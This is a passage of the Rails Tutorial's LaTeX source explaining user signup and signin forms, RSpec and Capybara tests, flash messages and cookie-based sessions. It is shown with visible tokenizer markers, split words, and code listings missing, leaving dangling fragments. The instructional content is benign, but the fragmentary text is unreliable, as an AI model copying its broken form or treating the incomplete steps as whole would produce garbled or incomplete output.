▁A ▁mockup ▁of ▁the ▁user ▁signup ▁page . ~\ href { http :// railstutorial . org / images / figures / signup _ mockup _ bootstrap - full . png }{ ( full ▁size )}
▁S ince ▁we ' re ▁about ▁to ▁add ▁the ▁ability ▁to ▁create ▁new ▁users ▁through ▁the ▁web , ▁let ' s ▁remove ▁the ▁user ▁created ▁at ▁the ▁console ▁in ▁Section ~\ ref { sec : creating _ a _ user }.
▁In ▁the ▁days ▁before ▁powerful ▁web ▁frameworks ▁with ▁full ▁testing ▁capabilities , ▁testing ▁was ▁often ▁p a in ful ▁and ▁error - prone .
▁With ▁RSpec ▁and ▁Capybara , ▁we ▁will ▁be ▁able ▁to ▁write ▁express ive ▁tests ▁to ▁automate ▁task s ▁that ▁used ▁to ▁have ▁to ▁be ▁done ▁by ▁hand .
▁We ' ve ▁already ▁seen ▁how ▁Capybara ▁supports ▁an ▁in t u i tive ▁web - nav ig ation ▁syntax .
▁Ou r ▁goal ▁now ▁is ▁to ▁write ▁tests ▁for ▁the ▁right ▁behavior ▁given ▁invalid ▁and ▁valid ▁signup ▁information .
▁Because ▁these ▁tests ▁are ▁fai r ly ▁advanced , ▁we ' ll ▁build ▁them ▁up ▁piece ▁by ▁piece .
▁Ou r ▁first ▁task ▁is ▁to ▁test ▁for ▁a ▁failing ▁signup ▁form , ▁and ▁we ▁can ▁simul ate ▁the ▁submission ▁of ▁invalid ▁data ▁by ▁visit ing ▁the ▁page ▁and ▁click ing ▁the ▁button ▁using ▁\ k ode { click \_ button } :
▁This ▁is ▁equivalent ▁to ▁visit ing ▁the ▁signup ▁page ▁and ▁ submitting ▁blank ▁signup ▁information ▁( which ▁is ▁invalid ).
▁Similar ly , ▁to ▁simul ate ▁the ▁submission ▁of ▁valid ▁data , ▁we ▁fill ▁in ▁valid ▁information ▁using ▁\ k ode { fi ll \_ in } :
▁The ▁purpose ▁of ▁our ▁tests ▁is ▁to ▁verify ▁that ▁click ing ▁the ▁signup ▁button ▁results ▁in ▁the ▁correct ▁behavior , ▁creating ▁a ▁new ▁user ▁when ▁the ▁information ▁is ▁valid ▁and ▁not ▁creating ▁a ▁user ▁when ▁it ' s ▁invalid .
▁Here ▁\ k ode { User . count } ▁is ▁\ k ode { 0 } ▁because ▁we ▁reset ▁the ▁database ▁at ▁the ▁beginning ▁of ▁this ▁section .
▁When ▁ submitting ▁invalid ▁data , ▁we ▁expect ▁the ▁user ▁count ▁not ▁to ▁change ; ▁when ▁ submitting ▁valid ▁data , ▁we ▁expect ▁it ▁to ▁change ▁by ▁1.
▁We ▁can ▁express ▁this ▁in ▁RSpec ▁by ▁com bin ing ▁the ▁\ k ode { ex p ec t } ▁method ▁with ▁either ▁the ▁\ k ode { to } ▁method ▁or ▁the ▁\ k ode { not \_ to } ▁method .
▁We ' ll ▁start ▁with ▁the ▁invalid ▁case ▁since ▁it ▁is ▁simple r ; ▁we ▁visit ▁the ▁signup ▁path ▁and ▁click ▁the ▁button , ▁and ▁we ▁expect ▁it ▁\ emph { not ▁to } ▁change ▁the ▁user ▁count :
▁This ▁is ▁for ▁the ▁benefit ▁of ▁the ▁\ k ode { change } ▁method , ▁which ▁take s ▁as ▁arguments ▁an ▁object ▁and ▁a ▁symbol ▁and ▁the n ▁calculat es ▁the ▁result ▁of ▁calling ▁that ▁symbol ▁as ▁a ▁method ▁on ▁the ▁object ▁both ▁before ▁and ▁after ▁the ▁block .
▁calculat es
▁before ▁and ▁after ▁the ▁execut ion ▁of
▁In ▁the ▁present ▁case , ▁we ▁want ▁the ▁given ▁code ▁\ emph { not } ▁to ▁change ▁the ▁count , ▁which ▁we ▁express ▁using ▁the ▁\ k ode { not \_ to } ▁method .
▁In ▁effect , ▁by ▁ en closing ▁the ▁button ▁click ▁in ▁a ▁block ▁we ▁are ▁able ▁to ▁replace
▁with ▁the ▁single ▁line
▁which ▁read s ▁like ▁natural ▁language ▁and ▁is ▁much ▁more ▁compact .
▁( Note ▁that ▁\ k ode { e q } ▁is ▁an ▁RSpec ▁method ▁to ▁test ▁equal ity .)
▁The ▁case ▁of ▁valid ▁data ▁is ▁similar , ▁but ▁instead ▁of ▁verify ing ▁that ▁the ▁user ▁count ▁does n ' t ▁change , ▁we ▁check ▁that ▁click ing ▁the ▁button ▁changes ▁the ▁count ▁by ▁1 :
▁This ▁uses ▁the ▁\ k ode { to } ▁method ▁because ▁we ▁expect ▁a ▁click ▁on ▁the ▁signup ▁button ▁with ▁valid ▁data ▁\ emph { to } ▁change ▁the ▁user ▁count ▁by ▁one .
▁as ▁show n ▁in ▁Listing ~\ ref { code : basic _ signup _ tests }.
▁Here ▁we ' ve ▁factor ed ▁out ▁the ▁common ▁text ▁for ▁the ▁submit ▁button ▁using ▁the ▁\ k ode { let } ▁method ▁to ▁define ▁a ▁\ k ode { submit } ▁variable .
▁G ood ▁basic ▁tests ▁for ▁sign ing ▁up ▁users .
▁To ▁get ▁them ▁to ▁pass , ▁we ▁have ▁to ▁create ▁a ▁signup ▁page ▁with ▁just ▁the ▁right ▁elements , ▁arrange ▁for ▁the ▁page ' s ▁submission ▁to ▁be ▁route d ▁to ▁the ▁right ▁place , ▁and ▁successfully ▁create ▁a ▁new ▁user ▁in ▁the ▁database ▁only ▁if ▁the ▁result ing ▁user ▁data ▁is ▁valid .
▁Of ▁course , ▁at ▁this ▁point ▁the ▁tests ▁should ▁fail :
▁Now ▁that ▁we ▁have ▁good ▁failing ▁tests ▁for ▁user ▁signup , ▁we ' ll ▁start ▁getting ▁them ▁to ▁pass ▁by ▁making ▁a ▁\ emph { form } ▁for ▁sign ing ▁up ▁users .
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : signup _ form }
▁( Re ad ers ▁ familiar ▁with ▁Rails ~ 2 . x ▁should ▁note ▁that ▁\ k ode { form \_ for } ▁uses ▁the ▁`` p er c ent - equal s '' ▁ERb ▁syntax ▁for ▁insert ing ▁content ;
▁Let ' s ▁break ▁this ▁down ▁into ▁pieces .
▁The ▁presence ▁of ▁the ▁\ k ode { do } ▁keyword ▁indicates ▁that ▁\ k ode { form \_ for } ▁take s ▁a ▁block ▁with ▁one ▁variable , ▁which ▁we ' ve ▁called ▁\ k ode { f } ▁for ▁`` form '' :
▁As ▁is ▁usually ▁the ▁case ▁with ▁Rails ▁helpers , ▁we ▁don ' t ▁need ▁to ▁know ▁any ▁details ▁about ▁the ▁implementation , ▁but ▁what ▁we ▁\ emph { do } ▁need ▁to ▁know ▁is ▁what ▁the ▁\ k ode { f } ▁object ▁does : ▁when ▁called ▁with ▁a ▁method ▁corresponding ▁to ▁an ▁\ href { http :// www . w 3 school s . com / html / html _ form s . as p }{ HTML ▁form ▁element }--- such ▁as ▁a ▁text ▁field , ▁ ra d io ▁button , ▁or ▁password ▁field --- it ▁returns ▁code ▁for ▁that ▁element ▁specifically ▁design ed ▁to ▁set ▁an ▁attribute ▁of ▁the ▁\ k ode {@ user } ▁object .
▁( The ▁\ k ode { - e } ▁here ▁arrange s ▁to ▁run ▁just ▁the ▁examples ▁who se ▁description ▁strings ▁match ▁\ k ode {" signup ▁page " }.
▁in ▁Listing ~\ ref { code : basic _ signup _ tests }.
▁To ▁get ▁these ▁tests ▁to ▁pass ▁again ▁and ▁to ▁get ▁our ▁form ▁to ▁render , ▁we ▁must ▁define ▁an ▁\ k ode {@ user } ▁variable ▁in ▁the ▁controller ▁action ▁corresponding ▁to ▁\ k ode { new . html . erb }, ▁i . e . , ▁the ▁\ k ode { new } ▁action ▁in ▁the ▁Users ▁controller .
▁as ▁seen ▁in ▁Listing ~\ ref { code : new _ action _ with _ user }.
▁With ▁the ▁\ k ode {@ user } ▁variable ▁so ▁defined , ▁the ▁test ▁for ▁the ▁signup ▁page ▁should ▁be ▁passing ▁again :
▁The ▁signup ▁form ▁\ href { http :// localhost :3000/ signup }{/ signup } ▁for ▁new ▁users . ~\ href { http :// railstutorial . org / images / figures / signup _ form _ bootstrap - full . png }{ ( full ▁size )}
▁A lthough ▁many ▁of ▁the ▁details ▁are ▁irrelevant ▁for ▁our ▁purposes , ▁let ' s ▁take ▁a ▁moment ▁to ▁highlight ▁the ▁most ▁important ▁parts ▁of ▁its ▁structure .
▁( Here ▁I ' ve ▁omitted ▁some ▁HTML ▁related ▁to ▁the ▁\ emph { authenticity ▁token }, ▁which ▁Rails ▁automatically ▁includes ▁to ▁ th w ar t ▁a ▁particular ▁kind ▁of ▁attack ▁called ▁a ▁\ emph { c ross - site ▁request ▁ forgery } ▁( CSRF ).
▁See ▁\ href { http :// stack overflow . com / questions / 9 4 1 59 4 / un d ers t and - rails - authenticity - token }{ the ▁S t ac k ▁Over flow ▁entry ▁on ▁the ▁Rails ▁ authenticity ▁token } ▁if ▁you ' re ▁interest ed ▁in ▁the ▁details ▁of ▁how ▁this ▁works ▁and ▁why ▁it ' s ▁important .)
▁A ▁ filled - in ▁form ▁with ▁\ k ode { text } ▁and ▁\ k ode { password } ▁fields . ~\ href { http :// railstutorial . org / images / figures / filled _ in _ form _ bootstrap - full . png }{ ( full ▁size )}
▁A ▁mockup ▁of ▁the ▁signup ▁failure ▁page . ~\ href { http :// railstutorial . org / images / figures / signup _ failure _ mockup _ bootstrap - full . png }{ ( full ▁size )}
▁from ▁Listing ~\ ref { code : basic _ signup _ tests } ▁to
▁Note ▁the ▁comment : ▁this ▁is ▁not ▁the ▁final ▁implementation , ▁but ▁it ' s ▁enough ▁to ▁get ▁us ▁started .
▁Signup ▁failure . ~\ href { http :// railstutorial . org / images / figures / signup _ failure _ rails _ 4 - full . png }{ ( full ▁size )}
▁Signup ▁failure ▁debug ▁information . ~\ href { http :// railstutorial . org / images / figures / signup _ failure _ rails _ 4 _ debug - full . png }{ ( full ▁size )}
▁We ▁can ▁double - check ▁this ▁by ▁verify ing ▁that ▁the ▁relevant ▁tests ▁fail :
▁- e ▁" signup ▁with ▁invalid ▁information "
▁P re v ious ▁versions ▁of ▁Rails ▁used ▁a ▁method ▁called ▁\ k ode { attr \_ accessible } ▁in ▁the ▁\ emph { model } ▁layer ▁to ▁solve ▁this ▁problem , ▁but ▁as ▁of ▁Rails ~4.0 ▁the ▁preferred ▁technique ▁is ▁to ▁use ▁so - called ▁\ emph { strong ▁parameters } ▁in ▁the ▁controller ▁layer .
▁As ▁a ▁final ▁step ▁in ▁handling ▁failed ▁user ▁creation , ▁we ' ll ▁add ▁helpful ▁error ▁messages ▁to ▁indicate ▁the ▁problem s ▁that ▁prevent ed ▁successful ▁re g ist r ation .
▁as ▁show n ▁in ▁Listing ~\ ref { code : f _ error _ messages }.
▁in ▁Listing ~\ ref { code : errors _ partial }.
▁F a il ed ▁signup ▁with ▁error ▁messages . ~\ href { http :// railstutorial . org / images / figures / signup _ error _ messages _ bootstrap - full . png }{ ( full ▁size )}
▁The ▁result ▁is ▁show n ▁in ▁F igure ~\ ref { fig : blank _ signup _ password _ digest }.
▁As ▁you ▁m ight ▁guess ▁from ▁the ▁working ▁page , ▁at ▁this ▁point ▁the ▁corresponding ▁test ▁should ▁also ▁pass :
▁The ▁result ▁of ▁visit ing ▁\ href { http :// localhost :3000/ signup }{/ signup } ▁and ▁just ▁click ing ▁`` Create ▁my ▁account ''. ~\ href { http :// railstutorial . org / images / figures / blank _ signup _ password _ digest _ bootstrap _4_0 - full . png }{ ( full ▁size )}
▁A ▁mockup ▁of ▁successful ▁signup . ~\ href { http :// railstutorial . org / images / figures / signup _ success _ mockup _ bootstrap - full . png }{ ( full ▁size )}
▁Currently , ▁the ▁test ▁for ▁valid ▁submission ▁should ▁be ▁failing :
▁This ▁is ▁because ▁the ▁default ▁behavior ▁for ▁a ▁Rails ▁action ▁is ▁to ▁render ▁the ▁corresponding ▁view , ▁but ▁there ▁is ▁not ▁( n or ▁should ▁there ▁be ) ▁a ▁view ▁template ▁corresponding ▁to ▁the ▁\ k ode { create } ▁action .
▁Instead , ▁we ▁need ▁to ▁redirect ▁to ▁a ▁different ▁page , ▁and ▁it ▁make s ▁sense ▁for ▁that ▁page ▁to ▁be ▁the ▁new ly ▁created ▁user ' s ▁profile .
▁Note ▁that ▁we ▁can ▁omit ▁the ▁\ k ode { user \_ url } ▁in ▁the ▁redirect , ▁writing ▁simply ▁\ k ode { redirect \_ to ▁@ user } ▁to ▁redirect ▁to ▁the ▁user ▁show ▁page .
▁Before ▁ submitting ▁a ▁valid ▁re g ist r ation ▁in ▁a ▁browser , ▁we ' re ▁going ▁to ▁add ▁a ▁bit ▁of ▁polish ▁common ▁in ▁web ▁applications : ▁a ▁message ▁that ▁appears ▁on ▁the ▁subsequent ▁page ▁( in ▁this ▁case , ▁we l com ing ▁our ▁new ▁user ▁to ▁the ▁application ) ▁and ▁the n ▁disappear s ▁upon ▁visit ing ▁a ▁second ▁page ▁or ▁on ▁page ▁reload .
▁The ▁Rails ▁way ▁to ▁accomplish ▁this ▁is ▁to ▁use ▁a ▁special ▁variable ▁called ▁the ▁\ emph { flash }, ▁which ▁we ▁can ▁treat ▁like ▁a ▁hash .
▁For ▁example , ▁if ▁\ k ode { flash [: success ] ▁= ▁" Welcome ▁to ▁the ▁S ample ▁App !" }, ▁the n ▁the ▁code
▁will ▁produce ▁this ▁HTML :
▁( Note ▁that ▁the ▁key ▁\ k ode { : success } ▁is ▁a ▁symbol , ▁but ▁ embedded ▁Ruby ▁automatically ▁convert s ▁it ▁to ▁the ▁string ▁\ k ode {" success "} ▁before ▁insert ing ▁it ▁into ▁the ▁template .)
▁The ▁reason ▁we ▁iterate ▁through ▁all ▁possible ▁key / value ▁pair s ▁is ▁so ▁that ▁we ▁can ▁include ▁other ▁kind s ▁of ▁flash ▁messages .
▁as ▁show n ▁in ▁Listing ~\ ref { code : signup _ flash }.
▁We ▁can ▁see ▁the ▁result ▁of ▁all ▁this ▁work ▁by ▁sign ing ▁up ▁our ▁first ▁user ▁under ▁the ▁name ▁`` Rails ▁Tutorial '' ▁and ▁email ▁address ▁`` \ text tt { example @ railstutorial . org } ''.
▁The ▁results ▁of ▁a ▁successful ▁user ▁signup , ▁with ▁flash ▁message . ~\ href { http :// railstutorial . org / images / figures / signup _ flash _ bootstrap - full . png }{ ( full ▁size )}
▁The ▁flash - less ▁profile ▁page ▁after ▁a ▁browser ▁reload . ~\ href { http :// railstutorial . org / images / figures / signup _ flash _ reload ed _ bootstrap - full . png }{ ( full ▁size )}
▁We ▁can ▁now ▁check ▁our ▁database ▁just ▁to ▁be ▁double - s ure ▁that ▁the ▁new ▁user ▁was ▁actually ▁created :
▁created _ at : ▁ "2013-0 3- 12 ▁0 5 : 5 1 : 34 ", ▁updated _ at : ▁ "2013-0 3- 12 ▁0 5 : 5 1 : 34 ",
▁password _ digest : ▁" $ 2 a $ 10 $ A 58 / j 7 w w h 3 a A ff G k M A O 9 Q . j j h 3 js h d . 6 a k h D K t ch A z / R ..."
▁A ▁working ▁signup ▁page ▁on ▁the ▁live ▁Web . ~\ href { http :// railstutorial . org / images / figures / signup _ in _ production _ bootstrap - full . png }{ ( full ▁size )}
▁in ▁Listing ~\ ref { code : f _ error _ messages }.
▁in ▁Listing ~\ ref { code : error _ messages _ test }.
▁S ug g est ed ▁error ▁messages ▁tests .
▁Tests ▁for ▁the ▁post - save ▁behavior ▁in ▁the ▁\ k ode { create } ▁action .
▁This ▁will ▁allow ▁us ▁to ▁add ▁customizations ▁base d ▁on ▁signin ▁status ▁and ▁base d ▁on ▁the ▁identity ▁of ▁the ▁current ▁user .
▁For ▁example , ▁in ▁this ▁chapter ▁we ' ll ▁update ▁the ▁site ▁header ▁with ▁signin / signout ▁links ▁and ▁a ▁profile ▁link .
▁Having ▁users ▁sign ▁in ▁will ▁also ▁allow ▁us ▁to ▁implement ▁a ▁security ▁model , ▁restrict ing ▁access ▁to ▁particular ▁pages ▁base d ▁on ▁the ▁identity ▁of ▁the ▁signed - in ▁user .
▁In ▁particular , ▁we ' ll ▁re - implement ▁a ▁couple ▁of ▁the ▁RSpec ▁integration ▁tests ▁in ▁Cucumber ▁to ▁see ▁how ▁the ▁two ▁methods ▁compare .
▁A ▁\ href { http :// en . wiki p edia . org / wiki / Session _ ( computer _ science ) }{\ emph { session } } ▁is ▁a ▁semi - permanent ▁connection ▁between ▁two ▁computer s , ▁such ▁as ▁a ▁client ▁computer ▁running ▁a ▁web ▁browser ▁and ▁a ▁server ▁running ▁Rails .
▁We ' ll ▁be ▁using ▁sessions ▁to ▁implement ▁the ▁common ▁pattern ▁of ▁`` sign ing ▁in '' , ▁and ▁in ▁this ▁context ▁there ▁are ▁sever al ▁different ▁models ▁for ▁session ▁behavior ▁common ▁on ▁the ▁web : ▁`` for getting '' ▁the ▁session ▁on ▁browser ▁close , ▁using ▁an ▁optional ▁`` remember ▁me '' ▁checkbox ▁for ▁ persistent ▁sessions , ▁and ▁automatically ▁remember ing ▁sessions ▁un til ▁the ▁user ▁explicitly ▁sign s ▁out
▁We ' ll ▁opt ▁for ▁the ▁final ▁of ▁these ▁options : ▁when ▁users ▁sign ▁in , ▁we ▁will ▁remember ▁their ▁signin ▁status ▁`` for ever '' , ▁clear ing ▁the ▁session ▁only ▁when ▁the ▁user ▁explicitly ▁sign s ▁out .
▁It ' s ▁convenient ▁to ▁model ▁sessions ▁as ▁a ▁RESTful ▁resource : ▁we ' ll ▁have ▁a ▁signin ▁page ▁for ▁\ emph { new } ▁sessions , ▁sign ing ▁in ▁will ▁\ emph { create } ▁a ▁session , ▁and ▁sign ing ▁out ▁will ▁\ emph { destroy } ▁it .
▁Un like ▁the ▁Users ▁resource , ▁which ▁uses ▁a ▁database ▁back - end ▁( via ▁the ▁User ▁model ) ▁to ▁persist ▁data , ▁the ▁Sessions ▁resource ▁will ▁use ▁a ▁\ href { http :// en . wiki p edia . org / wiki / HTTP _ cookie }{\ emph { cookie } }, ▁which ▁is ▁a ▁small ▁piece ▁of ▁text ▁placed ▁on ▁the ▁user ' s ▁browser .
▁M u ch ▁of ▁the ▁work ▁involve d ▁in ▁signin ▁comes ▁from ▁build ing ▁this ▁cookie - base d ▁authentication ▁machinery .
▁In ▁this ▁section ▁and ▁the ▁next , ▁we ' ll ▁ prepare ▁for ▁this ▁work ▁by ▁construct ing ▁a ▁Sessions ▁controller , ▁a ▁signin ▁form , ▁and ▁the ▁relevant ▁controller ▁actions .
▁To ▁get ▁started , ▁we ' ll ▁generate ▁a ▁Sessions ▁controller ▁and ▁an ▁integration ▁test ▁for ▁the ▁authentication ▁machinery :
▁A ▁mockup ▁of ▁the ▁signin ▁form . ~\ href { http :// railstutorial . org / images / figures / signin _ mockup _ bootstrap - full . png }{ ( full ▁size )}
▁as ▁show n ▁in ▁Listing ~\ ref { code : new _ session _ tests }.
▁Tests ▁for ▁the ▁\ k ode { new } ▁session ▁action ▁and ▁view .
▁The ▁tests ▁initially ▁fail , ▁as ▁required :
▁As ▁with ▁the ▁Users ▁resource , ▁we ▁can ▁use ▁the ▁\ k ode { resources } ▁method ▁to ▁define ▁the ▁standard ▁RESTful ▁routes :
▁S ince ▁we ▁have ▁no ▁need ▁to ▁show ▁or ▁edit ▁sessions , ▁we ' ve ▁restrict ed ▁the ▁actions ▁to ▁\ k ode { new }, ▁\ k ode { create }, ▁and ▁\ k ode { destroy } ▁using ▁the ▁\ k ode { : only } ▁option ▁accepted ▁by ▁\ k ode { resources }.
▁Note ▁the ▁use ▁of ▁\ k ode { via : ▁' delete ' } ▁for ▁the ▁ signout ▁route , ▁which ▁indicates ▁that ▁it ▁should ▁be ▁invoked ▁using ▁an ▁HTTP ▁\ text tt { DELETE } ▁request .
▁Note ▁that ▁the ▁routes ▁for ▁signin ▁and ▁ signout ▁are ▁custom , ▁but ▁the ▁route ▁for ▁creating ▁a ▁session ▁is ▁simply ▁the ▁default ▁( i . e . , ▁\ k ode { [ resource ▁name ] \_ path }).
▁page ▁for ▁a ▁new ▁session ▁( signin )
▁/ signout
▁delete ▁a ▁session ▁( sign ▁out )
▁The ▁initial ▁Sessions ▁controller .
▁The ▁final ▁step ▁is ▁to ▁define ▁the ▁initial ▁version ▁of ▁the ▁signin ▁page .
▁Note ▁that , ▁since ▁it ▁is ▁the ▁page ▁for ▁a ▁new ▁session , ▁the ▁signin ▁page ▁live s ▁in ▁the ▁file ▁\ k ode { app / views / sessions / new . html . erb }, ▁which ▁we ▁have ▁to ▁create .
▁in ▁Listing ~\ ref { code : initial _ signin _ page }.
▁The ▁initial ▁signin ▁view .
▁As ▁with ▁the ▁signup ▁form , ▁we ▁can ▁test ▁the ▁signin ▁form ▁by ▁using ▁Capybara ▁to ▁fill ▁in ▁the ▁form ▁values ▁and ▁the n ▁click ▁the ▁button .
▁In ▁the ▁process ▁of ▁writing ▁the ▁tests , ▁we ' ll ▁be ▁force d ▁to ▁design ▁aspect s ▁of ▁the ▁application , ▁which ▁is ▁one ▁of ▁the ▁nice ▁side - e ffect s ▁of ▁test - driven ▁development .
▁A ▁mockup ▁of ▁signin ▁failure . ~\ href { http :// railstutorial . org / images / figures / signin _ failure _ mockup _ bootstrap - full . png }{ ( full ▁size )}
▁We ' ll ▁render ▁the ▁error ▁as ▁a ▁flash ▁message , ▁which ▁we ▁can ▁test ▁for ▁as ▁follows :
▁The ▁\ k ode { ha ve \_ select or } ▁method ▁check s ▁for ▁a ▁particular ▁select or ▁element ▁( i . e . , ▁an ▁HTML ▁tag , ▁though ▁as ▁of ▁Capybara ~ 2 . 0 ▁it ▁only ▁works ▁for ▁\ emph { v is i b le } ▁elements ).
▁In ▁this ▁case , ▁we ' re ▁look ing ▁for
▁which ▁check s ▁for ▁a ▁\ k ode { div } ▁tag .
▁in ▁Listing ~\ ref { code : initial _ failing _ signin _ test }.
▁The ▁tests ▁for ▁signin ▁failure .
▁Having ▁written ▁tests ▁for ▁signin ▁failure , ▁we ▁now ▁turn ▁to ▁signin ▁ success .
▁The ▁changes ▁we ' ll ▁test ▁for ▁are ▁the ▁rendering ▁of ▁the ▁user ' s ▁profile ▁page ▁( as ▁determine d ▁by ▁the ▁page ▁title , ▁which ▁should ▁be ▁the ▁user ' s ▁name ), ▁together ▁with ▁three ▁plan n ed ▁changes ▁to ▁the ▁site ▁navigation :
▁The ▁appearance ▁of ▁a ▁link ▁to ▁the ▁profile ▁page
▁The ▁appearance ▁of ▁a ▁`` Sign ▁out '' ▁link
▁The ▁disappear ance ▁of ▁the ▁`` Sign ▁in '' ▁link
▁A ▁mockup ▁of ▁the ▁user ▁profile ▁after ▁a ▁successful ▁signin . ~\ href { http :// railstutorial . org / images / figures / signin _ success _ mockup _ bootstrap - full . png }{ ( full ▁size )}
▁in ▁Listing ~\ ref { code : signin _ success _ tests }.
▁ Test ▁for ▁signin ▁ success .
▁Here ▁we ' ve ▁introduce d ▁Capybara ' s ▁\ k ode { ha ve \_ link } ▁method .
▁It ▁take s ▁as ▁arguments ▁the ▁text ▁of ▁the ▁link ▁and ▁an ▁optional ▁\ k ode { : href } ▁parameter , ▁so ▁that
▁ensure s ▁that ▁the ▁an ch or ▁tag ~\ k ode { a } ▁has ▁the ▁right ▁\ k ode { href } ▁( URL ) ▁attribute --- in ▁this ▁case , ▁a ▁link ▁to ▁the ▁user ' s ▁profile ▁page .
▁Note ▁also ▁that ▁we ▁take ▁care ▁to ▁\ k ode { up case } ▁the ▁user ' s ▁email ▁address ▁to ▁make ▁sure ▁our ▁ability ▁to ▁find ▁the ▁user ▁in ▁the ▁database ▁is ▁case - insensitive .
▁With ▁our ▁tests ▁in ▁place , ▁we ' re ▁ready ▁to ▁start ▁developing ▁the ▁signin ▁form .
▁The ▁main ▁difference ▁between ▁this ▁and ▁the ▁signin ▁form ▁is ▁that ▁we ▁have ▁no ▁ Session ▁model , ▁and ▁hence ▁no ▁an a log ue ▁for ▁the ▁\ k ode {@ user } ▁variable .
▁as ▁show n ▁in ▁Listing ~\ ref { code : signin _ form }.
▁Code ▁for ▁the ▁signin ▁form .
▁The ▁signin ▁form ▁(\ href { http :// localhost :3000/ signin }{/ signin }). ~\ href { http :// railstutorial . org / images / figures / signin _ form _ bootstrap - full . png }{ ( full ▁size )}
▁As ▁in ▁the ▁case ▁of ▁creating ▁users ▁( signup ), ▁the ▁first ▁step ▁in ▁creating ▁sessions ▁( signin ) ▁is ▁to ▁handle ▁\ emph { invalid } ▁input .
▁in ▁Listing ~\ ref { code : initial _ create _ session }.
▁Recall ing ▁that ▁\ k ode { authenticate } ▁returns ▁\ k ode { false } ▁for ▁an ▁invalid ▁authentication , ▁our ▁strategy ▁for ▁user ▁signin ▁can ▁be ▁summariz ed ▁as ▁follows :
▁# ▁ Sign ▁the ▁user ▁in ▁and ▁redirect ▁to ▁the ▁user ' s ▁show ▁page .
▁# ▁Create ▁an ▁error ▁message ▁and ▁re - render ▁the ▁signin ▁form .
▁Instead , ▁we ' ll ▁put ▁a ▁message ▁in ▁the ▁flash ▁to ▁be ▁displayed ▁upon ▁failed ▁signin .
▁A ▁first , ▁slightly ▁in correct , ▁attempt ▁appears ▁in ▁Listing ~\ ref { code : failed _ signin _ attempt }.
▁An ▁( unsuccessful ) ▁attempt ▁at ▁handling ▁failed ▁signin .
▁The ▁flash ▁message ▁for ▁a ▁failed ▁signin . ~\ href { http :// railstutorial . org / images / figures / failed _ signin _ flash _ bootstrap - full . png }{ ( full ▁size )}
▁U nfortunately , ▁as ▁noted ▁in ▁the ▁text ▁and ▁in ▁the ▁comment ▁in ▁Listing ~\ ref { code : failed _ signin _ attempt }, ▁this ▁code ▁is n ' t ▁quite ▁right .
▁An ▁example ▁of ▁the ▁flash ▁persist ing . ~\ href { http :// railstutorial . org / images / figures / flash _ persistence _ bootstrap - full . png }{ ( full ▁size )}
▁This ▁flash ▁ persistence ▁is ▁a ▁bug ▁in ▁our ▁application , ▁and ▁before ▁proceeding ▁with ▁a ▁fix ▁it ▁is ▁a ▁good ▁idea ▁to ▁write ▁a ▁test ▁catch ing ▁the ▁error .
▁In ▁particular , ▁the ▁signin ▁failure ▁tests ▁are ▁current ly ▁passing :
▁But ▁the ▁tests ▁should ▁ never ▁pass ▁when ▁there ▁is ▁a ▁known ▁bug , ▁so ▁we ▁should ▁add ▁a ▁failing ▁test ▁to ▁catch ▁it .
▁For t un ate ly , ▁deal ing ▁with ▁a ▁problem ▁like ▁flash ▁ persistence ▁is ▁one ▁of ▁many ▁are as ▁where ▁integration ▁tests ▁really ▁ s h ine ; ▁they ▁let ▁us ▁say ▁exactly ▁what ▁we ▁mean :
▁After ▁ submitting ▁invalid ▁signin ▁data , ▁this ▁test ▁follows ▁the ▁Home ▁link ▁in ▁the ▁site ▁layout ▁and ▁the n ▁requires ▁that ▁the ▁flash ▁error ▁message ▁not ▁appear .
▁in ▁Listing ~\ ref { code : correct _ signin _ failure _ test }.
▁Co r re c t ▁tests ▁for ▁signin ▁failure .
▁The ▁new ▁test ▁fails , ▁as ▁required :
▁To ▁get ▁the ▁failing ▁test ▁to ▁pass , ▁instead ▁of ▁\ k ode { flash } ▁we ▁use ▁\ k ode { flash . now }, ▁which ▁is ▁specifically ▁design ed ▁for ▁display ing ▁flash ▁messages ▁on ▁rendered ▁pages ; ▁unlike ▁the ▁contents ▁of ▁\ k ode { flash }, ▁its ▁contents ▁disappear ▁as ▁soon ▁as ▁there ▁is ▁an ▁ additional ▁request .
▁in ▁Listing ~\ ref { code : correct _ signin _ failure }.
▁Co r re c t ▁code ▁for ▁failed ▁signin .
▁Now ▁the ▁test ▁suite ▁for ▁users ▁with ▁invalid ▁information ▁should ▁be ▁green :
▁Having ▁handle d ▁a ▁failed ▁signin , ▁we ▁now ▁need ▁to ▁actually ▁sign ▁a ▁user ▁in .
▁ Getting ▁there ▁will ▁require ▁some ▁of ▁the ▁most ▁challenging ▁Ruby ▁programming ▁so ▁far ▁in ▁this ▁tutorial , ▁so ▁ha n g ▁in ▁there ▁through ▁the ▁end ▁and ▁be ▁prepared ▁for ▁a ▁little ▁heav y ▁ li f ting .
▁H appily , ▁the ▁first ▁step ▁is ▁easy --- com p let ing ▁the ▁Sessions ▁controller ▁\ k ode { create } ▁action ▁is ▁a ▁ s n ap .
▁U nfortunately , ▁it ' s ▁also ▁a ▁ ch e at .
▁We ▁see ▁now ▁why ▁this ▁is ▁a ▁ ch e at : ▁a la s , ▁\ k ode { sign \_ in } ▁does n ' t ▁current ly ▁exist .
▁Writ ing ▁it ▁will ▁ o cc up y ▁the ▁rest ▁of ▁this ▁section .
▁The ▁complete d ▁Sessions ▁controller ▁\ k ode { create } ▁action ▁( not ▁yet ▁working ).
▁We ' re ▁now ▁in ▁a ▁position ▁to ▁start ▁implement ing ▁our ▁signin ▁model , ▁name ly , ▁remember ing ▁user ▁signin ▁status ▁`` for ever '' ▁and ▁end ing ▁the ▁session ▁only ▁when ▁the ▁user ▁explicitly ▁sign s ▁out .
▁The ▁signin ▁functions ▁themselves ▁will ▁end ▁up ▁c ross ing ▁the ▁tr ad it ion al ▁Model - View - Controller ▁lines ; ▁in ▁particular , ▁sever al ▁signin ▁functions ▁will ▁need ▁to ▁be ▁available ▁in ▁both ▁controllers ▁and ▁views .
▁We ▁could ▁make ▁an ▁entire ly ▁new ▁module ▁for ▁authentication , ▁but ▁the ▁Sessions ▁controller ▁already ▁comes ▁equip ped ▁with ▁a ▁module , ▁name ly , ▁\ k ode { Session s Helper }.
▁By ▁default , ▁all ▁the ▁helpers ▁are ▁available ▁in ▁the ▁views ▁but ▁not ▁in ▁the ▁controllers .
▁We ▁need ▁the ▁methods ▁from ▁the ▁Sessions ▁helper ▁in ▁both ▁place s , ▁so ▁we ▁have ▁to ▁include ▁it ▁explicitly .
